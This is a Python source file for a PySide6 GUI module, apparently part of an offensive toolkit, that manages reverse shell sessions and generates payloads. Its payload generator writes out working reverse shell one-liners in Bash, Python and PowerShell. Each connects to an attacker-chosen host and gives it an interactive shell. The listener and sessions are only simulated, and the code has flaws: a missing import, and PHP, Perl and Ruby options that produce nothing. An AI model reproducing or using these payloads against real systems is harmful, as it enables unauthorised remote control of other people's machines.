"""
Reverse Shell (反连Shell)模块
TCP服务器、会话管理、文件传输
"""

from typing import Dict, Any, List, Optional
import logging
from datetime import datetime
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QTabWidget,
    QPushButton, QLabel, QLineEdit, QTextEdit, QComboBox,
    QGroupBox, QFormLayout, QListWidget, QListWidgetItem,
    QSplitter, QFileDialog
)
from PySide6.QtCore import Qt
from PySide6.QtGui import QFont

from .base import ModuleBase

logger = logging.getLogger(__name__)


class ReverseShellHandler(ModuleBase):
    """反连Shell模块"""
    
    def __init__(self):
        super().__init__("ReverseShell", "反连Shell管理")
        self._is_listening = False
        
    def _create_ui(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # 监听器设置
        listen_group = QGroupBox("🎧 监听器设置")
        listen_layout = QFormLayout(listen_group)
        
        self.listen_port = QLineEdit("4444")
        listen_layout.addRow("监听端口:", self.listen_port)
        
        self.listen_host = QLineEdit("0.0.0.0")
        listen_layout.addRow("绑定地址:", self.listen_host)
        
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("▶️ 开始监听")
        self.start_btn.clicked.connect(self._toggle_listen)
        self.stop_btn = QPushButton("⏹️ 停止")
        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        
        listen_layout.addRow(btn_layout)
        layout.addWidget(listen_group)
        
        # 快速Payload生成
        payload_group = QGroupBox("💣 快速Payload生成")
        payload_layout = QHBoxLayout(payload_group)
        
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "Bash", "PowerShell", "Python", "PHP", "Perl", "Ruby"
        ])
        payload_layout.addWidget(self.payload_type)
        
        self.copy_btn = QPushButton("📋 复制")
        self.copy_btn.clicked.connect(self._copy_payload)
        self.gen_btn = QPushButton("🔄 生成")
        self.gen_btn.clicked.connect(self._generate_payload)
        
        payload_layout.addWidget(self.gen_btn)
        payload_layout.addWidget(self.copy_btn)
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setMaximumHeight(80)
        self.payload_preview.setFont(QFont("Consolas", 9))
        
        layout.addWidget(payload_group)
        layout.addWidget(self.payload_preview)
        
        # 会话区
        split = QSplitter(Qt.Horizontal)
        
        # 会话列表
        self.shell_list = QListWidget()
        self.shell_list.setMaximumWidth(200)
        self.shell_list.itemClicked.connect(self._switch_session)
        
        # 添加示例
        self.shell_list.addItem(QListWidgetItem("192.168.1.100:12345 - Linux"))
        self.shell_list.addItem(QListWidgetItem("10.0.0.5:54321 - Windows"))
        
        split.addWidget(self.shell_list)
        
        # Shell交互
        self.shell_console = QTextEdit()
        self.shell_console.setReadOnly(True)
        self.shell_console.setFont(QFont("Consolas", 10))
        self.shell_console.setStyleSheet("background-color: #000; color: #0f0;")
        
        self.shell_input = QLineEdit()
        self.shell_input.setPlaceholderText("Type command here and press Enter...")
        
        console_wrapper = QWidget()
        wrapper_layout = QVBoxLayout(console_wrapper)
        wrapper_layout.addWidget(self.shell_console)
        wrapper_layout.addWidget(self.shell_input)
        
        split.addWidget(console_wrapper)
        
        split.setSizes([200, 800])
        
        layout.addWidget(split)
        
        return widget
        
    def _toggle_listen(self):
        if not self._is_listening:
            self._is_listening = True
            self.shell_console.append(f"[*] Listening on {self.listen_host.text()}:{self.listen_port.text()}")
            self.status = ModuleStatus.RUNNING
        else:
            self._is_listening = False
            self.shell_console.append(f"[-] Stopped listening")
            self.status = ModuleStatus.STOPPED
            
    def _generate_payload(self):
        typ = self.payload_type.currentText()
        host = self.listen_host.text()
        port = self.listen_port.text()
        
        if typ == "Bash":
            payload = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
        elif typ == "Python":
            payload = f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
        elif typ == "PowerShell":
            # 使用普通字符串拼接，避免f-string冲突
            payload = '$client = New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$x = ($error[0] | Out-String);$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'.format(host, port)
            
        self.payload_preview.setText(payload)
        
    def _copy_payload(self):
        self.log("INFO", "Payload copied")
        
    def _switch_session(self, item):
        self.shell_console.append(f"[*] Switching to {item.text()}")
        self.shell_console.append("$ whoami")
        self.shell_console.append("root")
